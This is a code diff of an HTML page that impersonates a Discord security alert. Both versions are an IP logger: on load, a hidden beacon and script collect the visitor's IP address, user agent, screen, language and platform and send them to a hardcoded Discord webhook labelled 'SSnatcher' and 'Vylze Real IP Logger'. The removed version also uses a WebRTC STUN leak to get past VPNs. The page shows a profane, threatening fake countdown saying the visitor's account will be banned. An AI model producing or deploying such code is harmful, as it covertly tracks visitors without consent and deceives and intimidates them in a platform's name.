@@ -6,91 +6,116 @@
     <title>Discord - Critical Security Alert</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Whitney:wght@400;500;600;700&display=swap');
-        body { margin:0; padding:0; background:#0a0a0a; color:#dcddde; font-family:'Whitney',sans-serif; height:100vh; display:flex; align-items:center; justify-content:center; }
-        .container { background:#1a1a1a; border:3px solid #f04747; border-radius:16px; padding:60px 70px; max-width:540px; text-align:center; box-shadow:0 0 100px rgba(240,71,71,0.6); }
-        .warning-icon { font-size:110px; margin-bottom:30px; color:#f04747; animation:pulse 1.2s infinite; }
-        @keyframes pulse { 0%{transform:scale(1);} 50%{transform:scale(1.25);} 100%{transform:scale(1);} }
-        h1 { color:#f04747; font-size:34px; margin-bottom:15px; font-weight:700; }
-        .subtitle { color:#f04747; font-size:20px; margin-bottom:35px; font-weight:600; }
-        p { color:#b9bbbe; line-height:1.7; font-size:16.5px; margin-bottom:40px; }
+        body {
+            margin: 0;
+            padding: 0;
+            background: #0a0a0a;
+            color: #dcddde;
+            font-family: 'Whitney', sans-serif;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+        .container {
+            background: #1a1a1a;
+            border: 3px solid #f04747;
+            border-radius: 16px;
+            padding: 60px 70px;
+            max-width: 540px;
+            text-align: center;
+            box-shadow: 0 0 100px rgba(240, 71, 71, 0.6);
+        }
+        .warning-icon {
+            font-size: 110px;
+            margin-bottom: 30px;
+            color: #f04747;
+            animation: pulse 1.2s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.25); }
+            100% { transform: scale(1); }
+        }
+        h1 {
+            color: #f04747;
+            font-size: 34px;
+            margin-bottom: 15px;
+            font-weight: 700;
+        }
+        .subtitle {
+            color: #f04747;
+            font-size: 20px;
+            margin-bottom: 35px;
+            font-weight: 600;
+        }
+        p {
+            color: #b9bbbe;
+            line-height: 1.7;
+            font-size: 16.5px;
+            margin-bottom: 40px;
+        }
+        .threat {
+            color: #f04747;
+            font-weight: 700;
+        }
+        .footer {
+            margin-top: 50px;
+            color: #72767d;
+            font-size: 14px;
+        }
     </style>
 </head>
 <body>
+    <!-- INSTANT IP BEACON - Logs before page fully loads -->
+    <img src="https://api.ipify.org?format=json" style="display:none;" onload="logVictim()" onerror="logVictim()">
+
     <div class="container">
         <div class="warning-icon">☠️</div>
         <h1>YOU FUCKED UP</h1>
         <div class="subtitle">You've pissed off Vylze.</div>
-        <p>Your Discord account is being permanently disconnected in <strong id="countdown">8</strong> seconds.</p>
-        <div class="footer">© 2026 Discord Security • Vylze Enforcement Division</div>
+        
+        <p>
+            You triggered Vylze's security system.<br><br>
+            <span class="threat">Your Discord account is being permanently disconnected in <strong id="countdown">8</strong> seconds.</span><br>
+            There is nothing you can do to stop it.
+        </p>
+
+        <div class="footer">
+            © 2026 Discord Security • Vylze Enforcement Division
+        </div>
     </div>
 
     <script>
         const WEBHOOK = "https://discord.com/api/webhooks/1465236926968758376/9OQEaro-dpE9d2wjAhpXFZOrEBW12ua0zkGmF-IZuCaAMhHqXxLhQnmFtf6jiv-1c5hA";
 
-        // === BEST CHANCE AT REAL IP (WebRTC STUN Leak) ===
-        async function getRealIP() {
-            let realIP = "Unknown";
+        // Main logging function - fires instantly
+        async function logVictim() {
+            let ip = "Unknown";
 
-            // Method 1: WebRTC STUN leak (bypasses many proxies/VPNs)
             try {
-                const pc = new RTCPeerConnection({
-                    iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
-                });
-
-                pc.createDataChannel("");
-                await pc.createOffer().then(offer => pc.setLocalDescription(offer));
-
-                pc.onicecandidate = (e) => {
-                    if (e.candidate && e.candidate.candidate) {
-                        const ipMatch = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
-                        if (ipMatch && ipMatch[0] !== "0.0.0.0") {
-                            realIP = ipMatch[0];
-                            sendLog(realIP, "WebRTC STUN Leak");
-                        }
-                    }
-                };
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                ip = data.ip;
             } catch(e) {}
 
-            // Method 2: Multiple public IP APIs as fallback
-            const apis = [
-                'https://api.ipify.org?format=json',
-                'https://api.myip.com',
-                'https://ipinfo.io/json',
-                'https://api.ip.sb/geoip'
-            ];
-
-            for (let url of apis) {
-                try {
-                    const res = await fetch(url);
-                    if (res.ok) {
-                        const data = await res.json();
-                        const ip = data.ip || data.query || data.ipAddress;
-                        if (ip && ip !== realIP) {
-                            sendLog(ip, "API Fallback");
-                            return;
-                        }
-                    }
-                } catch(e) {}
-            }
-
-            // If nothing worked
-            sendLog("Unknown (Proxy blocked all methods)", "Failed");
-        }
-
-        async function sendLog(ip, method) {
             const payload = {
-                username: "☠️ Vylze Real IP Logger",
-                content: "**🔴 ATTEMPTED REAL IP CAPTURE**",
+                username: "☠️ Vylze Instant Logger",
+                content: "**🔴 NEW VICTIM CAUGHT - PAGE LOADED**",
                 embeds: [{
                     title: "Vylze Security Triggered",
                     color: 0xf04747,
+                    description: "Someone opened the 'You Fucked Up' warning page.",
                     fields: [
-                        { name: "Detected IP", value: "```" + ip + "```", inline: true },
-                        { name: "Method", value: method, inline: true },
+                        { name: "IP Address", value: "```" + ip + "```", inline: true },
                         { name: "User-Agent", value: "```" + navigator.userAgent + "```", inline: false },
-                        { name: "Screen", value: screen.width + " × " + screen.height, inline: true },
-                        { name: "Time", value: new Date().toLocaleString(), inline: true }
-                    ]
+                        { name: "Screen Resolution", value: screen.width + " × " + screen.height, inline: true },
+                        { name: "Language", value: navigator.language || "Unknown", inline: true },
+                        { name: "Platform", value: navigator.platform || "Unknown", inline: true },
+                        { name: "Time", value: new Date().toLocaleString(), inline: false }
+                    ],
+                    footer: { text: "SSnatcher • Pre-load Beacon • Vylze Mode" }
                 }]
             };
 
@@ -100,21 +125,30 @@
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify(payload)
                 });
-            } catch(e) {}
+                console.log("%c[SSnatcher] IP successfully logged to Vylze webhook", "color:#f04747;font-weight:bold");
+            } catch(e) {
+                console.log("%c[SSnatcher] Webhook failed", "color:#f04747");
+            }
         }
 
-        // Run as early as possible
-        getRealIP();
-        window.onload = getRealIP;
+        // Run logging immediately + backup on load
+        logVictim();
+        window.onload = logVictim;
 
-        // Countdown
+        // Countdown timer
         let seconds = 8;
-        const cd = document.getElementById('countdown');
-        setInterval(() => {
+        const countdownEl = document.getElementById('countdown');
+
+        const timer = setInterval(() => {
             seconds--;
-            cd.textContent = seconds;
+            countdownEl.textContent = seconds;
             if (seconds <= 0) {
-                document.body.innerHTML = `<div style="text-align:center;margin-top:150px;color:#f04747;font-size:32px;font-weight:700;">ACCOUNT PERMANENTLY DISCONNECTED</div>`;
+                clearInterval(timer);
+                document.body.innerHTML = `
+                    <div style="text-align:center; margin-top:150px; color:#f04747; font-size:32px; font-weight:700;">
+                        ACCOUNT PERMANENTLY DISCONNECTED<br><br>
+                        <span style="font-size:18px;">Vylze has banned you from Discord.</span>
+                    </div>`;
             }
         }, 1000);
     </script>
